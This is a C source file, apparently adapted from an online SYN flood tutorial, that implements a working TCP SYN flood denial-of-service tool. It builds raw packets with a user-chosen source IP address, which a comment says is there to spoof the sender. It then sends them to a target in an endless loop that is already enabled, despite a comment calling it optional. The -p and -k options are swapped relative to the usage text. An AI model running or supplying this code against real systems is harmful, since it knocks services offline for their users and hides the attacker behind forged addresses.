/*
 * from https://www.binarytides.com/syn-flood-dos-attack/
 */
#include <unistd.h>
#include <stdio.h>
#include <string.h> //memset
#include <sys/socket.h>
#include <stdlib.h> //for exit(0);
#include <errno.h> //For errno - the error number
#include <netinet/tcp.h>	//Provides declarations for tcp header
#include <netinet/ip.h>	//Provides declarations for ip header
#include <netinet/in.h>
#include <arpa/inet.h>
#include <getopt.h>

struct pseudo_header    //needed for checksum calculation
{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char placeholder;
	unsigned char protocol;
	unsigned short tcp_length;

	struct tcphdr tcp;
};

unsigned short csum(unsigned short *ptr,int nbytes) {
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum=0;
	while(nbytes>1) {
		sum+=*ptr++;
		nbytes-=2;
	}
	if(nbytes==1) {
		oddbyte=0;
		*((u_char*)&oddbyte)=*(u_char*)ptr;
		sum+=oddbyte;
	}

	sum = (sum>>16)+(sum & 0xffff);
	sum = sum + (sum>>16);
	answer=(short)~sum;

	return(answer);
}

int main(int argc, char *argv[])
{

	if (argc < 3) {
		fprintf(stderr, "usage: sudo %s [-s source-ip] [-d dest-ip] "
						"[-p source-port] [-k dest-port]\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	uid_t euid;

	euid = geteuid();
	if (euid != 0) {
		fprintf(stderr, "run as root");
		exit(EXIT_FAILURE);
	}

	int c;
	int n;
	int digit_optind = 0;
	//Datagram to represent the packet
	char datagram[4096];
	char source_ip[32], dest_ip[32];
	int sport, dport;
	//IP header
	struct iphdr *iph = (struct iphdr *) datagram;
	//TCP header
	struct tcphdr *tcph = (struct tcphdr *) (datagram + sizeof (struct ip));
	struct sockaddr_in sin;
	struct pseudo_header psh;

	while (1) {
		int option_index = 0;

		c = getopt_long(argc, argv, "s:d:p:k:",
				NULL, &option_index);
		if (c == -1)
			break;

		switch (c) {
		case 's':
			if (optarg)
				strncpy(source_ip, optarg, sizeof source_ip);
			break;

		case 'd':
			if (optarg)
				strncpy(dest_ip, optarg, sizeof dest_ip);
			break;

		case 'p':
			if (optarg)
				dport = atoi(optarg);

			if (dport>65535 || dport<1) {
				fprintf(stderr, "dport out of range");
				exit(EXIT_FAILURE);
			}
			break;

		case 'k':
			if (optarg)
				sport = atoi(optarg);

			if (sport > 65535 || sport < 1) {
				fprintf(stderr, "sport out of range");
				exit(EXIT_FAILURE);
			}
			break;

		default:
			fprintf(stderr, "usage: %s [-s source-ip] [-d dest-ip] "
							"[-p source-port] [-k dest-port]\n", argv[0]);
			exit(EXIT_FAILURE);
		}
	}

	//Create a raw socket
	int s = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);

	sin.sin_family = AF_INET;
	sin.sin_port = htons(dport);
	sin.sin_addr.s_addr = inet_addr(dest_ip);

	memset(datagram, 0, 4096);	/* zero out the buffer */

	//Fill in the IP Header
	iph->ihl = 5;
	iph->version = 4;
	iph->tos = 0;
	iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
	iph->id = htons(54321);	//Id of this packet
	iph->frag_off = 0;
	iph->ttl = 255;
	iph->protocol = IPPROTO_TCP;
	iph->check = 0;		//Set to 0 before calculating checksum
	iph->saddr = inet_addr(source_ip);	//Spoof the source ip address
	iph->daddr = sin.sin_addr.s_addr;

	iph->check = csum((unsigned short *) datagram, iph->tot_len >> 1);

	//TCP Header
	tcph->source = htons(sport);
	tcph->dest = htons(dport);
	tcph->seq = 0;
	tcph->ack_seq = 0;
	tcph->doff = 5;		/* first and only tcp segment */
	tcph->fin=0;
	tcph->syn=1;
	tcph->rst=0;
	tcph->psh=0;
	tcph->ack=0;
	tcph->urg=0;
	tcph->window = htons(5840);	/* maximum allowed window size */
	tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
				should fill in the correct checksum during transmission */
	tcph->urg_ptr = 0;
	//Now the IP checksum

	psh.source_address = inet_addr(source_ip);
	psh.dest_address = sin.sin_addr.s_addr;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(20);

	memcpy(&psh.tcp, tcph, sizeof (struct tcphdr));

	tcph->check = csum((unsigned short*) &psh, sizeof (struct pseudo_header));

	//IP_HDRINCL to tell the kernel that headers are included in the packet
	int one = 1;
	const int *val = &one;
	if (setsockopt (s, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0)
	{
		perror("setsockopt");
		// printf ("Error setting IP_HDRINCL. Error number : %d . Error message : %s \n" , errno , strerror(errno));
		exit(0);
	}

	//Uncommend the loop if you want to flood :)
	while (1)
	{
		//Send the packet
		if (sendto (s,		/* our socket */
					datagram,	/* the buffer containing headers and data */
					iph->tot_len,	/* total length of our datagram */
					0,		/* routing flags, normally always 0 */
					(struct sockaddr *) &sin,	/* socket addr, just like in */
					sizeof (sin)) < 0)		/* a normal send() */
		{
			printf ("error\n");
		}
		//Data send successfully
		else
		{
			printf ("Packet Send \n");
		}
	}

	return 0;
}
